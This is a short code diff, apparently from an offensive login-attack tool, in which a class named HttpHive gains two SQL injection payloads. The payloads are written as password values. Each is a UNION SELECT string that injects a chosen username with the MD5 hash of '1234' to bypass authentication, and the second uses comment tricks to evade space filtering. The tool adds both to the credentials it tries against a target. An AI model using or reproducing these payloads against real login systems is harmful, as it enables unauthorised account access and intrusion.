@@ -593,6 +593,12 @@ class HttpHive(Hive):
 			password = ''	
 			cred = Credential(user,password,self.target)
 			new_creds.append(cred)
+		md5BypassPassword0 = '1234 \' AND 1=0 UNION ALL SELECT \'%s\', \'81dc9bdb52d04dc20036dbd8313ed055'%username
+		credential0 = Credential(username,md5BypassPassword0,self.target)
+		new_creds.append(credential0)
+		md5BypassPassword1 = '1234/**/\'/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/\'%s\',/**/\'81dc9bdb52d04dc20036dbd8313ed055'%username	
+		credential1 = Credential(username,md5BypassPassword1,self.target)
+		new_creds.append(credential1)
 		return new_creds
 	
 	# function: __attemptSQLInjection__
